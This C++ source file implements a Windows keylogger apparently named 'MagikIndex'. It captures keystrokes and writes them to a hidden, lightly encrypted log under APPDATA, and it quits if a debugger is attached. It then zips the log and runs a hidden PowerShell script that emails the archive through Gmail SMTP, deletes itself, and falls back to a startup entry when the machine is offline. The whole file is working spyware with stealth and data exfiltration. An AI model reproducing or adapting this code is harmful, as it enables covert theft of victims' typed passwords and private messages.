#include "common.h"

std::set<DWORD> getAllThreadIds();
template <class InputIterator> HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest);
FILE* OUTPUT_FILE;

std::string Log::EncryptMyString(std::string UnencryptedString) {
#ifndef debug
    std::string CryptedString;
    for (int r = 0; r < UnencryptedString.size(); r++) {
        CryptedString += UnencryptedString[r] + ExtrapolatedKey;
    }
    UnencryptedString = CryptedString;
#endif
    return UnencryptedString;
}

void Log::LogItInt(int key_stroke) {
    if (key_stroke == 1 || key_stroke == 2)
        return;
    if (key_stroke == VK_MBUTTON || key_stroke == VK_XBUTTON1 || key_stroke == VK_XBUTTON2 || key_stroke == 7)
        return;

    fopen_s(&OUTPUT_FILE, log.c_str() , "a+");

    std::cout << key_stroke << std::endl;

    if (key_stroke == 8)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[BACKSPACE]"));
    else if (key_stroke == 13)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("\n"));
    else if (key_stroke == VK_SPACE)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString(" "));
    else if (key_stroke == VK_LWIN)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[WIN]"));
    else if (key_stroke == VK_TAB)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[TAB]"));
    else if (key_stroke == VK_CAPITAL)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CAPS LOCK]"));
    else if (key_stroke == VK_SHIFT)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[SHIFT]"));
    else if (key_stroke == VK_CONTROL)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[CONTROL]")); //later check for clipboard
    else if (key_stroke == VK_ESCAPE)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[ESCAPE]"));
    else if (key_stroke == VK_END)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[END]"));
    else if (key_stroke == VK_HOME)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[HOME]"));
    else if (key_stroke == VK_DELETE)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DELETE]"));
    else if (key_stroke == VK_LEFT)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[LEFT]"));
    else if (key_stroke == VK_UP)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[UP]"));
    else if (key_stroke == VK_RIGHT)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[RIGHT]"));
    else if (key_stroke == VK_DOWN)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("[DOWN]"));
    else if (key_stroke == 190 || key_stroke == 110)
        fprintf(OUTPUT_FILE, "%s", EncryptMyString("."));
    else
#ifndef debug
        key_stroke += ExtrapolatedKey;
#endif
    fprintf(OUTPUT_FILE, "%s", &key_stroke);
    fclose(OUTPUT_FILE);
}

void Log::LogItChar(std::string Value) {
#ifndef debug
    if (IsDebuggerPresent()) {
        FinalExit();
    }

#endif

    Value += "\n";

    std::ofstream File;
    File.open(log, std::ios_base::app);
    File << EncryptMyString(Value);
    File.close();
}
/*
void Compress(const buffer& in, buffer& out)
{
    auto rv = LZ4_compress_default(in.data(), out.data(), in.size(), out.size());
    if (rv < 1) std::cerr << "Something went wrong!" << std::endl;
    else out.resize(rv);
}

void CompressFile(std::string Path) {
    DWORD WrittenBytes;
    char FileBufferer[1000 + CharactersPerLog];
    buffer FileBuffer[1000 + CharactersPerLog];


    std::ifstream InputFile(Path, std::ios::binary);
    while (!InputFile.eof()) {
        InputFile.read(FileBufferer,sizeof(FileBufferer));
        strcat(FileBuffer, FileBufferer);
    }
    InputFile.close();
    DeleteFileA(Path.c_str());
    buffer data(1000, FileBuffer);
    buffer compressed(FileBuffer.size()), decompressed(data.size());
    Compress(FileBuffer, Compressed);
    HANDLE LZ4File = CreateFileA(Path.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    WriteFile(LZ4File, Compressed, strlen(Compressed), &WrittenBytes, NULL);
    CloseHandle(LZ4File);
}
*/
void Log::SendLog() {
    SetFileAttributesA(log.c_str(), FILE_ATTRIBUTE_HIDDEN);
    std::string ZipPath = log;
    ZipPath += ".zip";
    FILE* f = fopen(ZipPath.c_str(), "wb");
    fwrite("\x50\x4B\x05\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00", 22, 1, f);
    fclose(f);
    const char* files[] = {
        log.c_str()
    };
    {
        CoInitialize(NULL);
        CopyItems(std::cbegin(files), std::cend(files), ZipPath.c_str());
        CoUninitialize();
    }
    std::string Command = "/C powershell ";
    char SysDir[MAX_PATH];
    GetSystemDirectoryA(SysDir, MAX_PATH);
    DWORD WrittenBytes, DWFlags;
    char* AppData = nullptr;
    size_t AppDataSize;
    strcat_s(SysDir, MAX_PATH, "\\cmd.exe");
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");
    std::string Powershell = AppData;
    Powershell += "\\MagikIndex\\PSScript";
    Powershell += std::to_string(GetTickCount());
    Powershell += ".PS1";
    std::string PSStartup = "MagikMailer";
    PSStartup += std::to_string(GetTickCount());
    HANDLE PS1File = CreateFileA(Powershell.c_str(), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    std::string a = "$online = test-connection 8.8.8.8 -Count 1 -Quiet\nif ($online)\n{\n$SMTPServer = 'smtp.gmail.com'\n$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)\n$SMTPInfo.EnableSsl = $true\n$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('";
    a += SendersEmail;
    a += "', '";
    a += SendersPsw;
    a += "')\n$ReportEmail = New-Object System.Net.Mail.MailMessage\n$ReportEmail.From = '";
    a += SendersEmail;
    a += "'\n$ReportEmail.To.Add('";
    a += RecieversEmail;
    a += "')\n$ReportEmail.Subject = 'MagikIndex'\n$ReportEmail.Body = 'Your Magik Logger'\n$ReportEmail.Attachments.Add('";
    a += ZipPath.c_str();
    a += "')\n$SMTPInfo.Send($ReportEmail)\nRemove-Item $MyINvocation.InvocationName\nexit\n}\nelse\n{\nexit\n}";
    WriteFile(PS1File, a.c_str(), (DWORD)strlen(a.c_str()), &WrittenBytes, NULL);
    CloseHandle(PS1File);
    Command = "/C PowerShell.exe -ExecutionPolicy Unrestricted -command \"";
    Command += Powershell;
    Command += "\"";
    if (!InternetGetConnectedState(&DWFlags, NULL)) {
        //LogItChar("No Internet, scheduling task for log extraction...", CurrentLog);
        RegisterMyProgramForStartup(PSStartup.c_str(), SysDir, Command.c_str());
    }
    else {
        //LogItChar("Connected to the internet, sending the log...", CurrentLog);
        //system(Command.c_str());
        ShellExecuteA(NULL, "open", SysDir, Command.c_str(), NULL, SW_HIDE);
    }
}




int Log::ExtrapolateKey() {

    std::string Passwd = CryptPassword;
    int ExtrapolatedKey1 = BaseShiftValue;
    for (int plq = 0; plq < Passwd.size(); plq++) {
        ExtrapolatedKey1 += (int)Passwd[plq];
    }
    ExtrapolatedKey = ExtrapolatedKey1;
    return ExtrapolatedKey1;
}

void Log::CreateLog() {


    DWORD Tick = GetTickCount();
    char* AppData = nullptr;
    size_t AppDataSize;
    _dupenv_s(&AppData, &AppDataSize, "APPDATA");

    char PathToFile[MAX_PATH];
    HMODULE GetModH = GetModuleHandle(NULL);
    GetModuleFileNameA(GetModH, PathToFile, sizeof(PathToFile));

    std::string LogTime = std::to_string(Tick);

    std::string CurrentLog = AppData;
    CurrentLog += "\\MagikIndex";

    CreateDirectoryA(CurrentLog.c_str(), NULL);

    SetFileAttributesA(CurrentLog.c_str(), FILE_ATTRIBUTE_HIDDEN);

    CurrentLog += "\\Log";
    CurrentLog += LogTime;
    CurrentLog += ".txt";
    log = CurrentLog;
}


std::set<DWORD> getAllThreadIds()
{
    auto processId = GetCurrentProcessId();
    auto currThreadId = GetCurrentThreadId();
    std::set<DWORD> thread_ids;
    std::unique_ptr< void, decltype(&CloseHandle) > h(CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0), CloseHandle);
    if (h.get() != INVALID_HANDLE_VALUE)
    {
        THREADENTRY32 te;
        te.dwSize = sizeof(te);
        if (Thread32First(h.get(), &te))
        {
            do
            {
                if (te.dwSize >= (FIELD_OFFSET(THREADENTRY32, th32OwnerProcessID) + sizeof(te.th32OwnerProcessID)))
                {
                    //only enumerate threads that are called by this process and not the main thread
                    if ((te.th32OwnerProcessID == processId) && (te.th32ThreadID != currThreadId))
                    {
                        thread_ids.insert(te.th32ThreadID);
                    }
                }
                te.dwSize = sizeof(te);
            } while (Thread32Next(h.get(), &te));
        }
    }
    return thread_ids;
}

template <class InputIterator>
HRESULT CopyItems(__in InputIterator first, __in InputIterator last, __in PCSTR dest)
{
    _COM_SMARTPTR_TYPEDEF(IShellDispatch, IID_IShellDispatch);
    _COM_SMARTPTR_TYPEDEF(Folder, IID_Folder);
    IShellDispatchPtr shell;
    FolderPtr destFolder;

    variant_t dirName, fileName, options;

    HRESULT hr = CoCreateInstance(CLSID_Shell, NULL, CLSCTX_INPROC_SERVER, IID_IShellDispatch, (void**)&shell);
    if (SUCCEEDED(hr))
    {
        dirName = dest;
        hr = shell->NameSpace(dirName, &destFolder);
        if (SUCCEEDED(hr))
        {
            auto existingThreadIds = getAllThreadIds();
            options = FOF_SILENT | FOF_NOCONFIRMATION | FOF_NOERRORUI;  //NOTE:  same result as 0x0000
            while (first != last)
            {
                fileName = *first;
                printf("Copying %s to %s ...\n", *first, dest);
                ++first;
                hr = destFolder->CopyHere(fileName, options); //NOTE: this appears to always return S_OK even on error

                auto updatedThreadIds = getAllThreadIds();
                std::vector<decltype(updatedThreadIds)::value_type> newThreadIds;
                std::set_difference(updatedThreadIds.begin(), updatedThreadIds.end(), existingThreadIds.begin(), existingThreadIds.end(), std::back_inserter(newThreadIds));

                std::vector<HANDLE> threads;
                for (auto threadId : newThreadIds)
                    threads.push_back(OpenThread(SYNCHRONIZE, FALSE, threadId));

                if (!threads.empty())
                {
                    // Waiting for new threads to finish not more than 5 min.
                    WaitForMultipleObjects((DWORD)threads.size(), &threads[0], TRUE, 5 * 60 * 1000);

                    for (size_t i = 0; i < threads.size(); i++)
                        CloseHandle(threads[i]);
                }
            }
        }
    }
    return hr;
}